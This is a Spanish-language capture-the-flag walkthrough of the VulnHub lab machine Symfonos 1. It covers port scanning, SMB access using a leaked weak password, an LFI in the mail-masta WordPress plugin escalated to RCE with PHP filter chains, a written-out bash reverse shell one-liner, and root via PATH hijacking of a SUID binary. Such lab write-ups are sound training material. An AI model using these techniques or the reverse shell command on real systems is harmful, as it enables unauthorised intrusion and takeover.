#ctf-machine #vulnhub #easy-machine #linux [VulnhubLink](https://www.vulnhub.com/entry/symfonos-1,322/)

## Enumeración inicial
Como no conocemos la dirección IPv4 de la máquina víctima, realizamos un primer escaneo ARP con `arp-scan`:
![[Pasted image 20240901155210.png]]

La IP de la máquina vícitima es la "192.168.159.149" ya que el OUI de las máquinas que se importan en VMWare es "00:0c".

Lanzamos una traza ICMP con `ping`:
![[Pasted image 20240901155236.png]]

Como el TTL=64 podemos decir que probablemente estemos ante una máquina Linux ya que las máquinas Linux suelen tener este valor de TTL.

### Nmap
Hacemos un primer escaneo con `nmap` para detectar los puertos TCP abiertos de la máquina vícitima:
![[Pasted image 20240901155353.png]]

Como vemos hay 5 puertos abiertos, el puerto 22,25,80,139,445. Así que hacemos un segundo escaneo con `nmap` para detectar la versión y servicio que corren para estos puertos:
![[Pasted image 20240901155706.png]]![[Pasted image 20240901155725.png]]

Como vemos hay una web por el puerto 80, SSH por el puerto 22, SMTP por el puerto por el puerto 25 y el servicio SMB por el puerto 445.

Hacemos un tercer escaneo con `nmap` para detectar algunos directorios web:
![[Pasted image 20240901160011.png]]
Como vemos hay un directorio `/manual/`.

## Enumeracion SMB
Si utilizamos la herramienta `smbclient` para listar los recursos disponibles vemos lo siguiente:
![[Pasted image 20240901160842.png]]

Por lo que probamos de conectarnos primero a "anonymous". Como vemos hay una archivo "attention.txt":
![[Pasted image 20240901160942.png]]

Por lo que nos lo descargamos con "get":
![[Pasted image 20240901161000.png]]

Una vez descargado miramos su contenido y vemos que es una advertencia para que los usuarios dejen de utilizar contraseñas como las que indica:
![[Pasted image 20240901161046.png]]

Por lo que podemos probar de conectarnos al recurso "helios" como el usuario "helios" con estas contraseñas. Y vemos que con la contraseña "qwerty", tenemos acceso:
![[Pasted image 20240901161150.png]]

Vemos dos archivos por lo que nos los descargamos con "get".
![[Pasted image 20240901161318.png]]

Si visualizamos el archivo "research.txt" no vemos nada interesante pero si mostramos el archivo "todo.txt" vemos:
![[Pasted image 20240901161405.png]]

Imaginamos que se trata de un directorio web por lo que accedemos a la web.

## Enumeración web
Si accedemos a la página principal solo vemos una imagen:
![[Pasted image 20240901161453.png]]

Por lo que intentamos acceder al directorio que nos indica el archivo vemos que hay un blog de Wordpress:
![[Pasted image 20240901161555.png]]

Si lanzamos un `wpscan` para detectar *plugins* vulnerables encontramos:
```bash
wpscan --url http://192.168.159.149/h3l105/ --plugins-detection aggressive  --api-token XXXXXXXXXXXXXXXXXXX
```
![[Pasted image 20240901164313.png]]

Por lo que si accedemos a:
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php

Y utilizamos el parámetro "pl", tenemos un LFI:
![[Pasted image 20240901164733.png]]

Por lo que podemos intentar apuntar archivos *log* para acontecer un *LogPoisoning* pero no tenemos acceso a ver los *logs*, por lo que podemos utilizar los *wrappers* de PHP y sus *encoders* para generar un código PHP malicioso con esta herramienta:
https://github.com/synacktiv/php_filter_chain_generator

Por lo que la ejecutamos para generar la cadena correspondiente al código PHP malicioso:
![[Pasted image 20240901165341.png]]

Y la introducimos en el parámetro "pl" de la URL, ademas de concatenarle el parámetro "cmd"="whoami":
![[Pasted image 20240901165444.png]]

Y como vemos, tenemos RCE. Por lo que con el parámetro "cmd", ejecutamos siguiente comando para entablarnos una *reverse shell*:
```bash
bash -c "bash -i >& /dev/tcp/192.168.159.131/443 0>&1"
```

Por lo que si nos ponemos en escucha con `nc` por el puerto 443 obtenemos la *reverse shell*:
![[Pasted image 20240901165909.png]]

Por lo que hacemos el tratamiento de la TTY:
![[Pasted image 20240901170156.png]]
![[Pasted image 20240901170248.png]]

## Escalada de privilegios
Si buscamos archivos con permiso SUID en el sistema vemos un archivo SUID no común:
![[Pasted image 20240901172427.png]]

Si listamos las cadenas de caracteres leíbles con `strings` vemos que se hace una llamada al binario `curl` de forma relativa por lo que podemos realizar un *Path Hijacking*. Por lo que añadimos el directorio `/tmp` al PATH:
![[Pasted image 20240901172703.png]]

Una vez añadido, creamos un archivo con nombre "curl" con este contenido y le damos permisos de ejecución:
![[Pasted image 20240901172804.png]]

Por lo que si ahora ejecutamos el binario obtenemos una "bash" como *root*:
![[Pasted image 20240901172850.png]]

Finalmente, visualizamos la *flag* en el directorio `/root`:
![[Pasted image 20240901172922.png]]


___
#abusing-suid #path-hijacking #smb #information-leakage #local-file-inclusion 
___

